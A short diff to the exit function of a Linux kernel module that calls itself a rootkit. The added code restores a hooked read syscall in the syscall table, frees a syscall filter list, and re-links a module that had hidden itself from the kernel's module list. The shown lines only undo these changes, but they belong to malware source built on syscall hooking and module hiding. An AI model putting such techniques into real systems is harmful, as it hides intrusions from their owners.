@@ -263,7 +263,25 @@ static int __init rootkit_init(void) {
 }
 
 static void __exit rootkit_exit(void) {
-  // TODO: unhook syscall and cleanup syscall filter list
+  struct filter_info *pos, *next;
+  
+  if (total_references[__NR_read] > 0) {
+      list_for_each_entry(pos, &filter_list.list, list) {
+          if (pos->syscall_nr == __NR_read) {
+              sys_call_table_p[__NR_read] = (syscall_fn_t)pos->orig_handler_addr;
+              break;
+          }
+      }
+  }
+
+  list_for_each_entry_safe(pos, next, &filter_list.list, list) {
+      list_del(&pos->list);
+      kfree(pos);
+  }
+
+  if (is_hidden && module_list) {
+      list_add(&THIS_MODULE->list, module_list);
+  }
 
   pr_info("%s: removed\n", OURMODNAME);
   device_destroy(cls, MKDEV(major, 0));
